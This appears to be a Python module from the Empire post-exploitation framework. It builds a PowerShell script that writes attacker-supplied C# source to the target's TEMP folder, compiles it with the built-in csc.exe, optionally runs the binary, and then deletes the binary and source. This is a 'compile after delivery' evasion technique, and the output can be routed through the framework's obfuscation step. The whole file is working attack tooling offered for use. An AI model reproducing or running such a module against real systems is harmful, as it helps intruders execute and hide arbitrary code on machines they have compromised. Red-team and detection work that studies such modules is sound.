import re

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # The CSharpCode option is inlined directly into the generated script
        # as a PowerShell single-quoted here-string (@'...'@). Single-quoted
        # here-strings are fully literal — no escaping of any kind is performed
        # by PowerShell inside them. The only content that would break the
        # here-string is a line that starts with '@, which closes the block.
        csharp_code = params["CSharpCode"]
        output_path = params["OutputPath"]
        execute_literal = "$true" if params["Execute"].lower() == "true" else "$false"

        # Guard against the one sequence that would prematurely close the
        # single-quoted here-string and allow arbitrary PowerShell injection.
        if re.search(r"^'@", csharp_code, re.MULTILINE):
            raise ModuleValidationException(
                "[!] CSharpCode contains '@' at the start of a line, which would "
                "close the PowerShell here-string. Remove or indent that line."
            )

        # OutputPath is embedded inside a regular single-quoted PS string, not
        # a here-string, so single quotes there do need to be doubled.
        escaped_output_path = output_path.replace("'", "''")

        script = (
            "$CSharpCode = @'\n"
            f"{csharp_code}\n"
            "'@\n"
            f"$OutputPath = $ExecutionContext.InvokeCommand.ExpandString('{escaped_output_path}')\n"
            f"$Execute = {execute_literal}\n"
            "\n"
            '$SourcePath = "$env:TEMP\\payload_source.cs"\n'
            "$CscPath = 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe'\n"
            "\n"
            "if (-not (Test-Path $CscPath)) {\n"
            "    $CscPath = 'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe'\n"
            "}\n"
            "\n"
            "if (-not (Test-Path $CscPath)) {\n"
            "    Write-Output '[-] csc.exe not found. .NET Framework 4.0 required.'\n"
            "    return\n"
            "}\n"
            "\n"
            'Write-Output "[*] Writing C# source to: $SourcePath"\n'
            "try {\n"
            "    [System.IO.File]::WriteAllText($SourcePath, $CSharpCode)\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to write C# source: $($_.Exception.Message)"\n'
            "    return\n"
            "}\n"
            "\n"
            "Write-Output '[*] Compiling with csc.exe...'\n"
            '$compileArgs = @("/out:$OutputPath", $SourcePath)\n'
            "$proc = Start-Process -FilePath $CscPath -ArgumentList $compileArgs -Wait -PassThru -NoNewWindow\n"
            "if ($proc.ExitCode -ne 0) {\n"
            '    Write-Output "[-] Compilation failed with exit code: $($proc.ExitCode)"\n'
            "    Remove-Item -Path $SourcePath -Force -ErrorAction SilentlyContinue\n"
            "    return\n"
            "}\n"
            'Write-Output "[+] Compilation succeeded: $OutputPath"\n'
            "\n"
            "if ($Execute) {\n"
            '    Write-Output "[*] Executing compiled binary: $OutputPath"\n'
            "    $output = & $OutputPath 2>&1\n"
            "    Write-Output $output\n"
            "    Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue\n"
            "}\n"
            "else {\n"
            '    Write-Output "[*] Compile-only mode. Binary saved to: $OutputPath"\n'
            "}\n"
            "\n"
            "Remove-Item -Path $SourcePath -Force -ErrorAction SilentlyContinue\n"
            "Write-Output '[+] Compile-after-delivery completed.'\n"
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
